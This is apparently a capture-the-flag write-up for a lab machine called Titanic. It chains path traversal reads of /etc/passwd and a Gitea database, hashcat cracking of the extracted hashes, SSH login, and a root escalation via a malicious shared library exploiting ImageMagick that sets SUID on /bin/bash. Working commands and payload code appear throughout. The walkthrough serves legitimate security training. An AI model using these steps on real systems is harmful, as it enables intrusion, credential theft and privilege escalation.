#box #path-traversal #vhost #docker #docker-compose #gitea #credentials #gitea2hashcat #imagemagick #suid #GTFOBins 
1. We discover on port 80 a website where you can book tickets. Within a basic enumeration we discover an endpoint where it's possible to retrieve our tickets
![[attachments/titanic-1.png]]
2. We add the `ticket` parameter and discover that the endpoint responds accordingly
![[attachments/titanic-2.png]]
3. We try a quick Path Traversal and we discover that it works, so we're able to understand the user's residing on the machine within `/etc/passwd`
```sh
curl -s http://titanic.htb/download?ticket=/etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
4. After querying the `/etc/hosts` file we discover the presence of `dev.titanic.htb` vhost, so we add it on on our hosts file and reach it to discover a gitea running on that virtual host
```sh
curl -s http://titanic.htb/download?ticket=/etc/hosts            
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
5. Inside the gitea instance we discover the application on which it's running port 80 and we discover the `docker-config` for the `gitea` instance. There's another one for mysql with an apparent password but it leads nowhere.
![[attachments/titanic-3.png]]
6. The key information, in that file, is that this `/data` folder from the gitea container is mapped onto `/home/developer/gitea/data`. As suggested from IppSec here: https://www.youtube.com/watch?v=2tQ3VhdwVsU&t=565s we can get the docker-compose and try mount it on our end. Once it's mounted we can access it to discover the exact location where we can find the configuration file.
7. So we get the docker compose and we run it. In the screenshot below we'll show the installation process, the access to the container and the target file:
```sh
vim docker-compose.yml # and we insert the docker-compose.yml file above
docker-compose up -d # to run and install the docker-compose
docker ps -a # we validate it's up and running and get its container id
docker exec -it abcd /bin/sh # we enter the container 
# We investigate the container and discover this structure
/data # tree
.
├── git
├── gitea
│   ├── conf
│   │   └── app.ini
│   └── log
└── ssh
    ├── ssh_host_ecdsa_key
    ├── ssh_host_ecdsa_key.pub
    ├── ssh_host_ed25519_key
    ├── ssh_host_ed25519_key.pub
    ├── ssh_host_rsa_key
    └── ssh_host_rsa_key.pub

5 directories, 7 files
```

![[attachments/titanic-4.png]]
8. Knowing that `/data` is mapped to `/home/developer/data` we should now be able to access the `app.ini` file at `/home/developer/gitea/data/gitea/conf/app.ini` through our LFI, finding the location of the database file
```sh
curl -s http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
```

![[attachments/titanic-5.png]]
9. Again, we profit from our LFI and proceed to download the database file at `/home/developer/gitea/data/gitea/gitea.db`
```sh
curl -s http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -o gitea.db
```
10. Once obtained the database, we discover that an `user` table is present inside of it. However, the hashing algorithm seems not to be liked by hashcat. By looking online, we discover this post https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes which gives us a script to convert gitea hashes to hashcat's liked hashes. We download it and proceed to query the database with the proper query to then have a hashes format that can be passed to that tool:
```sql
select email,salt,passwd,passwd_hash_algo from user;
```

![[attachments/titanic-6.png]]

11. We convert both the hashes to the hashcat format and as suggested by the tool itself we can know crack the new hashes with mode 10900
```sh
python3 gitea2hashcat.py "8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56"
python3 gitea2hashcat.py "2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136"
```
12. One of those will results in the following password `25282528`
```sh
hashcat -m 10900 cat_hashes /usr/share/wordlists/rockyou.txt
```
![[attachments/titanic-7.png]]
13.  And within `developer` we discover we can authenticate to SSH with `developer:25282528`
14. Inside the machine we discover inside the `/opt/scripts` folder called `identify_images.sh`. The script does search for all the `.jpg` files inside `/opt/app/static/assets/images` and pipes them to `magick`.
![[attachments/titanic-8.png]]
15. By discovering the`magick` version being 7.1.1-35 we discover that this version is vulnerable to Arbitrary Code Execution https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
![[attachments/titanic-9.png]]
16. The LPE is not extremely straight forward as what we must do is create a shared library in the folder where root is executing that `identify_images.sh` script in order to force the execution of `magick` when that script is launched by `root` to execute a command of our choice. To do so, we'll create the shared library mentioned in the link above inside `/opt/app/static/assets/images`:
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("mkdir /tmp/IAmRoot"); 
    exit(0);
}
EOF

# the mkdir will tell us whether this is being executed and whether root is effectively creating the folder
```
17. After a minute we'll notice that the folder has been created and has been created by root
![[attachments/titanic-10.png]]
18.  At this point we can either put a SUID on `/bin/bash` to escalate or get a reverse shell as `root`
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("chmod 4000 /bin/bash"); 
    exit(0);
}
EOF
```

Before
![[attachments/titanic-11.png]]
After
![[attachments/titanic-12.png]]

19. At this point, a simple `/bin/bash -p` would gave us a shell as `root` https://gtfobins.org/gtfobins/bash/
![[attachments/titanic-13.png]]